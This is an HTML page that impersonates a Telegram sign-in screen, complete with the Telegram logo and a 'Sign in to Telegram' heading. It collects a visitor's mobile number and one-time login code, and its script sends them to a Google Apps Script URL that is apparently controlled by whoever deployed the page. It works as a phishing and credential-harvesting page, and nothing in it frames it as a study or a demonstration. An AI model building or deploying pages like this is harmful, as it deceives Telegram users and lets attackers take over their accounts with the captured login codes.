<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telegram Login</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f0f0f0;
            font-family: Arial, sans-serif;
        }
        .login-container {
            background: white;
            padding: 50px;
            border-radius: 2px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            text-align: center;
        }
        input {
            width: 102%;
            padding: 10px;
            margin: 8px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        button {
            width: 111%;
            padding: 15px;
            background-color: #4A90E2;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        button:hover {
            background-color: darkskyblue;
        }
    </style>
</head>
<body>
     <div class="login-container">
        <img src="Telegram-Logo.png" width="300" height="150" alt="logo">
        <h2>Sign in to Telegram</h2>
        <input type="text" id="mobile" placeholder="Enter mobile number" maxlength="13" name="mobile number">
        <input type="text" id="OTP" placeholder="Enter OTP (any number)" name="OTP">  </br>
        <button onclick="verifyOTP()">Verify</button> </div>

    <script>
        const googleAppsScriptURL = "https://script.google.com/macros/library/d/1DbmGMO1oVpHvRCRwnYhcrl1fHLr_U9oITV52btCFpb9q0p4ppd_dFG85/1"; // **REPLACE THIS**

        async function verifyOTP() {
            let mobileNumber = document.getElementById("mobile").value.trim();
            let enteredOTP = document.getElementById("OTP").value.trim();

            if (!mobileNumber) {
                alert("Please enter a mobile number");
                return;
            }

            if (!enteredOTP) {
                alert("Please enter a value for OTP");
                return;
            }

            // In a real application, you would validate the mobile number format here.

            let data = {
                mobile: mobileNumber,
                otp: enteredOTP // Include the entered value
            };

            try {
                let response = await fetch(googleAppsScriptURL, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify(data)
                });

                let result = await response.json();
                console.log("Server Response:", result);

                if (result.status && result.status.toLowerCase() === "success") {
                    alert("Data saved successfully!");
                } else {
                    alert("Failed to save data: " + (result.message || "Unknown error"));
                }
            } catch (error) {
                console.error("Error storing data:", error);
                alert("Error connecting to the server.");
            }
        }
    </script>
</body>
</html>
